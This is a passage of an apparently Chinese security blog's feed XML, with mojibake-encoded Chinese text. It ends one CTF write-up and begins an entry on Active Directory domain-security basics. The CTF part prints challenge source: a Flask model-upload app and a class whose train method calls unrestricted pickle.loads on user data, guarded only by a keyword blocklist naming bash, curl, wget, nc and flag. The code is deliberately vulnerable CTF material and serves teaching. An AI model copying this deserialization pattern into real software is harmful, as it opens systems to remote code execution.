punctuation">.</span>load_model<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>                model_train <span class="token operator">=</span> CHIKAWA<span class="token punctuation">.</span>train<span class="token punctuation">(</span>model<span class="token punctuation">.</span>data<span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"module_name </span><span class="token interpolation"><span class="token punctuation">&#123;</span>model<span class="token punctuation">.</span>model_name<span class="token punctuation">&#125;</span></span><span class="token string">, </span><span class="token interpolation"><span class="token punctuation">&#123;</span>model_train<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"wrong data </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'File not found.'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'model'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/download/&lt;int:model_id>'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span>model_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    conn <span class="token operator">=</span> get_db<span class="token punctuation">(</span><span class="token punctuation">)</span>    cursor <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'SELECT filename FROM models WHERE id = ?'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>model_id<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    file_record <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> file_record<span class="token punctuation">:</span>        file_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> file_record<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> send_from_directory<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> file_record<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'File not found.'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'model'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/delete/&lt;int:model_id>'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>model_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    conn <span class="token operator">=</span> get_db<span class="token punctuation">(</span><span class="token punctuation">)</span>    cursor <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'SELECT filename FROM models WHERE id = ? AND user_id = ?'</span><span class="token punctuation">,</span>                    <span class="token punctuation">(</span>model_id<span class="token punctuation">,</span> session<span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    file_record <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> file_record<span class="token punctuation">:</span>        file_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> file_record<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>            os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>        cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'DELETE FROM models WHERE id = ?'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>model_id<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'model'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>chikawa.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> builtins<span class="token keyword">import</span> io<span class="token keyword">import</span> pickle<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> hmacsafe_builtins <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'range'</span><span class="token punctuation">,</span>    <span class="token string">'complex'</span><span class="token punctuation">,</span>    <span class="token string">'set'</span><span class="token punctuation">,</span>    <span class="token string">'frozenset'</span><span class="token punctuation">,</span>    <span class="token string">'slice'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>ALLOWED_MODEL_CLASSES <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'CHIKAWA'</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">RestrictedUnpickler</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>Unpickler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">find_class</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> module <span class="token operator">==</span> <span class="token string">"chikawa"</span> <span class="token keyword">and</span> name <span class="token operator">==</span> <span class="token string">"CHIKAWA"</span><span class="token punctuation">:</span>            <span class="token keyword">from</span> chikawa <span class="token keyword">import</span> CHIKAWA            <span class="token keyword">return</span> CHIKAWA        <span class="token keyword">if</span> module <span class="token operator">==</span> <span class="token string">"builtins"</span> <span class="token keyword">and</span> name <span class="token keyword">in</span> safe_builtins<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>builtins<span class="token punctuation">,</span> name<span class="token punctuation">)</span>        <span class="token keyword">if</span> module <span class="token operator">==</span> <span class="token string">"__main__"</span> <span class="token keyword">or</span> name <span class="token keyword">in</span> ALLOWED_MODEL_CLASSES<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>find_class<span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span>        <span class="token keyword">raise</span> pickle<span class="token punctuation">.</span>UnpicklingError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"global '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>module<span class="token punctuation">&#125;</span></span><span class="token string">.</span><span class="token interpolation"><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span></span><span class="token string">' is forbidden"</span></span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">restricted_loads</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> secret_key<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> secret_key <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            data<span class="token punctuation">,</span> received_digest <span class="token operator">=</span> s<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b'::'</span><span class="token punctuation">)</span>            computed_digest <span class="token operator">=</span> hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>secret_key<span class="token punctuation">,</span> data<span class="token punctuation">,</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> hmac<span class="token punctuation">.</span>compare_digest<span class="token punctuation">(</span>computed_digest<span class="token punctuation">,</span> received_digest<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">raise</span> pickle<span class="token punctuation">.</span>UnpicklingError<span class="token punctuation">(</span><span class="token string">"HMAC verification failed"</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">raise</span> pickle<span class="token punctuation">.</span>UnpicklingError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"HMAC verification error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> s    <span class="token keyword">return</span> RestrictedUnpickler<span class="token punctuation">(</span>io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">CHIKAWA</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> model_name<span class="token punctuation">,</span> data<span class="token punctuation">,</span> parameters<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>model_name <span class="token operator">=</span> model_name        self<span class="token punctuation">.</span>data <span class="token operator">=</span> data        self<span class="token punctuation">.</span>parameters <span class="token operator">=</span> parameters <span class="token keyword">or</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        self<span class="token punctuation">.</span>_validate_parameters<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">_validate_parameters</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>model_name<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"model_name must be a string"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>parameters<span class="token punctuation">,</span> <span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"parameters must be a dictionary"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">train</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">import</span> pickle        forbidden <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b"bash"</span><span class="token punctuation">,</span> <span class="token string">b"flag"</span><span class="token punctuation">,</span> <span class="token string">b"tac"</span><span class="token punctuation">,</span> <span class="token string">b"cat"</span><span class="token punctuation">,</span> <span class="token string">b"ls"</span><span class="token punctuation">,</span> <span class="token string">b"sh"</span><span class="token punctuation">,</span> <span class="token string">b"whoami"</span><span class="token punctuation">,</span> <span class="token string">b"curl"</span><span class="token punctuation">,</span> <span class="token string">b"wget"</span><span class="token punctuation">,</span> <span class="token string">b"rm"</span><span class="token punctuation">,</span> <span class="token string">b"echo"</span><span class="token punctuation">,</span> <span class="token string">b"chmod"</span><span class="token punctuation">,</span> <span class="token string">b"chown"</span><span class="token punctuation">,</span> <span class="token string">b"scp"</span><span class="token punctuation">,</span> <span class="token string">b"ssh"</span><span class="token punctuation">,</span> <span class="token string">b"ftp"</span><span class="token punctuation">,</span> <span class="token string">b"nc"</span><span class="token punctuation">,</span> <span class="token string">b"netcat"</span><span class="token punctuation">,</span> <span class="token string">b"telnet"</span><span class="token punctuation">,</span> <span class="token string">b"python"</span><span class="token punctuation">,</span> <span class="token string">b"perl"</span><span class="token punctuation">,</span> <span class="token string">b"ruby"</span><span class="token punctuation">,</span> <span class="token string">b"java"</span><span class="token punctuation">,</span> <span class="token string">b"php"</span><span class="token punctuation">,</span> <span class="token string">b"javascript"</span><span class="token punctuation">,</span> <span class="token string">b"node"</span><span class="token punctuation">,</span> <span class="token string">b"exec"</span><span class="token punctuation">,</span> <span class="token string">b"eval"</span><span class="token punctuation">,</span> <span class="token string">b"import"</span><span class="token punctuation">,</span> <span class="token string">b"subprocess"</span><span class="token punctuation">,</span> <span class="token string">b"*"</span><span class="token punctuation">,</span> <span class="token string">b"fl"</span><span class="token punctuation">,</span> <span class="token string">b"fla"</span><span class="token punctuation">,</span> <span class="token string">b"env"</span><span class="token punctuation">,</span> <span class="token string">b"proc"</span><span class="token punctuation">,</span> <span class="token string">b"\\x"</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>f <span class="token keyword">in</span> data <span class="token keyword">for</span> f <span class="token keyword">in</span> forbidden<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"Hacker!"</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            models <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>            <span class="token keyword">return</span> models        <span class="token keyword">except</span> pickle<span class="token punctuation">.</span>UnpicklingError <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">def</span> <span class="token function">predict</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> input_text<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>input_text<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"Input must be a string"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>parameters<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"trained"</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>model_name<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>input_text<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token format-spec">-1]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">return</span> <span class="token string">"Model not trained yet."</span>    <span class="token decorator annotation punctuation">@staticmethod</span>    <span class="token keyword">def</span> <span class="token function">load_model</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> secret_key<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> restricted_loads<span class="token punctuation">(</span>data<span class="token punctuation">,</span> secret_key<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>__class__<span class="token punctuation">,</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>model_name<span class="token punctuation">,</span> self<span class="token punctuation">.</span>parameters<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;é»‘ç›’ pickle æ˜¯åæ–‡æ˜ï¼&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
    <category term="Pickle" scheme="http://c1oudfl0w0.github.io/blog/tags/Pickle/"/>
    
  </entry>
  
  <entry>
    <title>åŸŸå®‰å…¨åŸºç¡€</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/09/04/%E5%9F%9F%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/09/04/%E5%9F%9F%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</id>
    <published>2025-09-04T07:20:15.000Z</published>
    <updated>2026-01-17T18:29:29.358Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š</p><p><a href="https://cloud.tencent.com/developer/article/1624522">https://cloud.tencent.com/developer/article/1624522</a></p><p><a href="https://www.freebuf.com/articles/system/272298.html">https://www.freebuf.com/articles/system/272298.html</a></p><p><a href="https://blog.csdn.net/qq_28205153/article/details/113827476">https://blog.csdn.net/qq_28205153/article/details/113827476</a></p><p><a href="https://www.freebuf.com/sectool/360319.html">https://www.freebuf.com/sectool/360319.html</a></p><p><a href="https://www.cnblogs.com/-mo-/p/11890232.html">https://www.cnblogs.com/-mo-/p/11890232.html</a></p><p><a href="https://blog.csdn.net/qq_42077227/article/details/130279040">https://blog.csdn.net/qq_42077227/article/details/130279040</a></p><p><a href="https://www.cnblogs.com/websecyw/p/15964217.html">https://www.cnblogs.com/websecyw/p/15964217.html</a></p><p><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8GPO%E4%B8%AD%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C">https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8GPO%E4%B8%AD%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C</a></p><p>ã€Šå†…ç½‘æ¸—é€ä½“ç³»å»ºè®¾ã€‹ Nu1L Team</p><span id="more"></span><hr><h1 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h1><p>å‡è®¾ä½ æ˜¯æŸéƒ¨é—¨çš„ç®¡ç†äººå‘˜ï¼Œå¸Œæœ›èƒ½å¤Ÿæ‹¥æœ‰è¯¥éƒ¨é—¨çš„æ‰€æœ‰æœåŠ¡å™¨çš„ç™»é™†ã€é…ç½®æƒé™ï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯éœ€è¦å»æ‰€æœ‰æœåŠ¡å™¨ä¸Šåˆ›å»ºç®¡ç†å‘˜è´¦æˆ·å‘¢ï¼Ÿä¸€æ—¦éœ€è¦ä¿®æ”¹ï¼Œå°±éœ€è¦å»æ¯å°æœåŠ¡å™¨ä¸Šéƒ½æ‰§è¡Œä¸€æ¬¡æ“ä½œ</p><p>å¦‚æœè¿™äº›æœåŠ¡å™¨éƒ½åœ¨ä¸€ä¸ªåŸŸé‡Œé¢ï¼Œç®¡ç†å‘˜åªéœ€è¦ç”¨åŸŸç®¡ç†å‘˜è´¦å·ä¿®æ”¹ä¸€æ¬¡ï¼Œé…ç½®å°±ä¼šç»Ÿä¸€ä¸‹å‘åˆ°æ‰€æœ‰æœåŠ¡å™¨ä¸Šï¼Œæå¤§ç¨‹åº¦ä¸Šå‡å°‘äº†æˆ‘ä»¬çš„å·¥ä½œé‡ã€‚</p><p>ç›¸å…³æ¦‚å¿µï¼š</p><ul><li>**åŸŸ(Domain)**ï¼šå°†ç½‘ç»œä¸­çš„å¤šå°è®¡ç®—æœºé€šè¿‡é€»è¾‘çš„æ–¹å¼ç»„ç»‡åˆ°ä¸€èµ·ï¼Œè¿›è¡Œé›†ä¸­ç®¡ç†ï¼Œè¿™ç§é›†ä¸­ç®¡ç†çš„ç¯å¢ƒç§°ä¸ºåŸŸã€‚</li><li>**åŸŸæ§åˆ¶å™¨ï¼ˆDomain Controllerï¼ŒDC)**ï¼šæ¯ä¸ªåŸŸä¸­è‡³å°‘æœ‰ä¸€å°åŸŸæ§åˆ¶å™¨ã€é›†ä¸­å­˜æ”¾æ•´ä¸ªåŸŸçš„ç”¨æˆ·è´¦å·å’Œå®‰å…¨æ•°æ®åº“ï¼Œå®‰è£…äº†æ´»åŠ¨ç›®å½•(AD)çš„ä¸»æœºç§°ä¸ºåŸŸæ§åˆ¶å™¨ã€‚</li><li>**æ´»åŠ¨ç›®å½•ï¼ˆActive Directoryï¼ŒAD)**ï¼šæ´»åŠ¨ç›®å½•æ˜¯ä¸€ä¸ªç›®å½•æ•°æ®åº“ï¼Œå­˜å‚¨æ•´ä¸ªwindowsç½‘ç»œä¸­å¯¹è±¡çš„ç›¸å…³ä¿¡æ¯ï¼ˆå¯ä»¥ç†è§£ä¸ºå­˜å‚¨äº†ç½‘ç»œä¸­æ‰€æœ‰èµ„æºçš„å¿«æ·æ–¹å¼ï¼‰ã€‚ä¹Ÿæ˜¯ä¸€ç§æœåŠ¡ï¼Œå¯å¯¹æ´»åŠ¨ç›®å½•ä¸­æ•°æ®æ‰§è¡Œå„ç§æ“ä½œã€‚</li><li><strong>çˆ¶åŸŸå’Œå­åŸŸ</strong>ï¼šå‡ºäºç®¡ç†éœ€æ±‚ï¼Œéœ€è¦åœ¨ç½‘ç»œä¸­åˆ’åˆ†å¤šä¸ªåŸŸã€‚ç¬¬ä¸€ä¸ªåŸŸç§°ä¸ºçˆ¶åŸŸï¼Œå„åˆ†éƒ¨çš„åŸŸç§°ä¸ºå­åŸŸã€‚ä¸åŒçš„åŸŸä¹‹é—´ï¼Œä¿¡æ¯äº¤äº’çš„æ¡ç›®ä¼šå¤§å¤§å‡å°‘ï¼Œä¸”å¯ä»¥å‹ç¼©åè¿›è¡Œäº¤äº’ï¼ŒèŠ‚çº¦å¸¦å®½ã€‚å¹¶ä¸”åŸŸç®¡å¯ä»¥é’ˆå¯¹å„ä¸ªåŸŸï¼Œè®¾ç½®ä¸åŒçš„å®‰å…¨ç­–ç•¥ï¼Œçµæ´»ç®¡ç†ã€‚</li><li>**åŸŸæ ‘ (Tree)**ï¼šåŸŸç®¡åªèƒ½ç®¡ç†æœ¬åŸŸï¼Œå¦‚æœéœ€è¦ç®¡ç†å…¶ä»–åŸŸï¼Œåˆ™éœ€è¦å»ºç«‹ä¿¡ä»»å…³ç³»ï¼ŒåŸŸæ ‘åˆ™æ˜¯æŒ‡å¤šä¸ªåŸŸé€šè¿‡å»ºç«‹ä¿¡ä»»å…³ç³»ç»„æˆçš„é›†åˆã€‚åŒç†ï¼Œå¤šä¸ªåŸŸæ ‘é€šè¿‡å»ºç«‹ä¿¡ä»»å…³ç³»ç»„æˆçš„é›†åˆåˆ™ç§°ä¸ºåŸŸæ—ã€‚</li><li>**åŸŸåæœåŠ¡å™¨ (DNS)**ï¼šç”¨äºå®ç°åŸŸåå’Œä¸ä¹‹å¯¹åº”çš„IPåœ°å€ä¹‹é—´ç›¸äº’è½¬æ¢ã€‚å› 